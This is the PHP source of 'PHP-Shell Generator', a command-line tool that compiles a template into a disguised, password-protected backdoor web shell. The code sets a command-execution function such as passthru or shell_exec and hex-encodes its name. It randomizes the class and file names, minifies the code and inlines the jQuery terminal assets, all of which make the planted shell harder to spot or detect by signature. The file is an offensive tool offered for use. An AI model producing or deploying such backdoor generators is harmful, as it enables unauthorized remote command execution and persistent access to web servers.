<?php
// phpcs:ignore error

/**
 * Prints the program header.
 * @return void
 */
function _header()
{
    printf("PHP-Shell Generator\n");
    printf("http://cixtor.com/phpshell\n");
    printf("https://github.com/cixtor/phpshellgen\n");
    printf("https://en.wikipedia.org/wiki/Backdoor_Shell\n");
    printf("\n");
}

/**
 * Prints the program usage.
 * @return void
 */
function _usage()
{
    _header();
    printf("Parameters:\n");
    printf("  -h | --help      | Print this message with the list of available options.\n");
    printf("  -i | --input     | Specify the shell template to compile.\n");
    printf("  -o | --output    | Specify the filename for the compiled shell.\n");
    printf("  -s | --shell     | Specify the default PHP interpreter.\n");
    printf("  -u | --username  | Specify the username to log into the php-shell.\n");
    printf("  -p | --password  | Specify the password to log into the php-shell.\n");
    printf("  -l | --lint      | Enable the PHP linter on the compiled shell.\n");
    printf("\n");
    printf("Methods:\n");
    printf("  set_interpreter        | Set the PHP shell interpreter: set_interpreter(shell_exec)\n");
    printf("  get_interpreter        | Get the current PHP shell interpreter.\n");
    printf("  get_disabled_functions | Get the list of functions disabled through a 'php.ini' file.\n");
    printf("  get_php_version        | Get the version of the PHP interpreter in execution time.\n");
    printf("  logout                 | Close the current shell session.\n");
    printf("  status                 | Display all the configuration variables.\n");
    printf("  cd new/folder/path/    | Change the current working directory.\n");
    printf("\n");
    printf("Usage:\n");
    printf("  phpshellgen\n");
    printf("  phpshellgen -o /output/here/shell.php\n");
    printf("  phpshellgen -i /path/to/template.php\n");
    printf("  phpshellgen -s shell_exec\n");
    printf("  phpshellgen -u USERNAME -p PASSWORD\n");
    exit(2);
}

/**
 * Returns a random string of characters with length L.
 * @param  int|integer $n            How many characters to return.
 * @param  bool        $specialChars How many characters to return.
 * @return string                    Random string of characters.
 */
function randomString(int $n = 0, bool $specialChars = false) : string
{
    $p = "";
    $s = [
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
        'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B',
        'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
        'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3',
        '4', '5', '6', '7', '8', '9',
    ];

    if ($specialChars) {
        $s = array_merge($s, ['@', '#', '$', '%', '&', '-', '+', '=']);
    }

    $b = openssl_random_pseudo_bytes($n);
    $t = strlen($b);
    $m = count($s);

    for ($i = 0; $i < $t; $i++) {
        $p .= $s[hexdec(bin2hex($b[$i])) % $m];
    }

    return $p;
}

/**
 * Converts a string of characters into hexadecimal.
 * @param  string $s String of characters.
 * @return string    String represented in hexadecimal.
 */
function str2hex(string $s = "") : string
{
    $h = "";
    $t = strlen($s);
    for ($i = 0; $i < $t; $i++) {
        $h .= '\x' . bin2hex($s[$i]);
    }
    return $h;
}

/**
 * Read local file, strip new lines, and return.
 * @param  string $f File path.
 * @return string    File content.
 */
function loadScript(string $f = "") : string
{
    return str_replace("\n", "", file_get_contents($f));
}

$config = [
    "input" => null,
    "output" => randomString(10) . ".php",
    "shell" => "passthru",
    "username" => "cixtor",
    "password" => randomString(20, true),
    "username_hash" => "",
    "password_hash" => "",
    "class_name" => randomString(rand(10, 30)),
    "lint" => false,
];

$opts = getopt("i:o:s:u:p:hl");

if (empty($opts)) {
    _usage();
}

foreach ($opts as $name => $value) {
    switch ($name) {
        case "i": // input
            $config["input"] = $value;
            break;
        case "o": // output
            $config["output"] = $value;
            break;
        case "s": // shell
            $config["shell"] = $value;
            break;
        case "u": // username
            $config["username"] = $value;
            break;
        case "p": // password
            $config["password"] = $value;
            break;
        case "l": // lint
            $config["lint"] = $value;
            break;
        case "h": // help
            _usage();
    }
}


_header();

$config["username_hash"] = password_hash($config["username"], PASSWORD_BCRYPT);
$config["password_hash"] = password_hash($config["password"], PASSWORD_BCRYPT);

if (!array_key_exists("i", $opts)) {
    $opts["i"] = "template.txt";
}

printf("-> Creating shell script: \033[0;94m%s\033[0m\n", $config["output"]);
printf("   Randomizing PHP class name: \033[0;91mclass %s{...}\033[0m\n", $config["class_name"]);

// Read a user-provided template or the default template, if necessary.
$lines = file($opts["i"], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$out = "";

foreach ($lines as $line) {
    if (preg_match("/^\s*\/\//", $line) || preg_match("/^\s*(\/)?\*(\/)?/", $line)) {
        continue;
    } elseif (preg_match("/'username' => '',/", $line)) {
        // Change the line with the username.
        printf("   Username: \033[0;94m%s\033[0m (%s)\n", $config["username_hash"], $config["username"]);
        $out .= sprintf("'username'=>'%s',", $config["username_hash"]);
    } elseif (preg_match("/'password' => '',/", $line)) {
        // Change the line with the password.
        printf("   Password: \033[0;94m%s\033[0m (%s)\n", $config["password_hash"], $config["password"]);
        $out .= sprintf("'password'=>'%s',", $config["password_hash"]);
    } elseif (preg_match("/'interpreter' => '',/", $line)) {
        // Change the line with the shell interpreter.
        $hashed_func = str2hex($config["shell"]);
        printf("   Setting shell interpreter: \033[0;94m%s\033[0m (%s)\n", $hashed_func, $config["shell"]);
        $out .= sprintf("'interpreter'=>\"%s\",", $hashed_func);
    } elseif (preg_match("/^class Shell/", $line) || preg_match("/new Shell\(\)/", $line)) {
        // Change the line with the class name.
        $out .= str_replace("Shell", $config["class_name"], $line);
    } elseif (preg_match("/^<\?php$/", $line)) {
        // Change the line with the PHP tags.
        $out .= sprintf("<?php ");
    } elseif (strpos($line, '<script type="text/javascript" src="jquery.min.js"></script>') !== false) {
        // Insert a JavaScript dependency: jQuery.
        printf("   Adding JavaScript dependency: jQuery\n");
        $out .= sprintf("<script type='text/javascript'>%s</script>", loadScript("jquery.min.js"));
    } elseif (strpos($line, '<script type="text/javascript" src="jquery.terminal.min.js"></script>') !== false) {
        // Insert a JavaScript dependency: jQuery.Terminal.
        printf("   Adding JavaScript dependency: jQuery.Terminal\n");
        $out .= sprintf("<script type='text/javascript'>%s</script>", loadScript("jquery.terminal.min.js"));
    } elseif (strpos($line, '<link rel="stylesheet" type="text/css" href="jquery.terminal.min.css">') !== false) {
        // Insert a CSS dependency: jQuery.Terminal
        printf("   Adding CSS dependency: jQuery.Terminal\n");
        $out .= sprintf("<style type='text/css'>%s</style>", loadScript("jquery.terminal.min.css"));
    } else {
        // Minify the rest of the code.
        $line = preg_replace("/\t/", "\x20\x20\x20\x20", $line);
        $line = preg_replace("/\s{4}/", '', $line);
        $line = preg_replace("/(if|each|switch|return)\s\(/", '$1(', $line);
        $line = preg_replace("/\}\selse/", '}else', $line);
        $line = preg_replace("/\s+\|\|/", '||', $line);
        $line = preg_replace("/\|\|\s+/", '||', $line);
        $line = preg_replace("/\s+\?\s+/", '?', $line);
        $line = preg_replace("/\s+:\s+/", ':', $line);
        $line = preg_replace("/\s+&&/", '&&', $line);
        $line = preg_replace("/&&\s+/", '&&', $line);
        $line = preg_replace("/=>\s+/", '=>', $line);
        $line = preg_replace('/,\s\$/', ',$', $line);
        $line = preg_replace("/\s\.=/", '.=', $line);
        $line = preg_replace("/\s+=/", '=', $line);
        $line = preg_replace("/=\s+/", '=', $line);
        $line = preg_replace("/\s\{/", '{', $line);
        $line = preg_replace("/\s\!/", '!', $line);

        if (!empty($line)) {
            $out .= $line;
        }
    }
}

if (empty($config["output"])) {
    echo $out . "\n";
    exit(0);
}

file_put_contents($config["output"], $out . "\n", LOCK_EX);
// %x{php -l #{config[:output]}} if config[:lint]==true
printf("-> Finished\n");
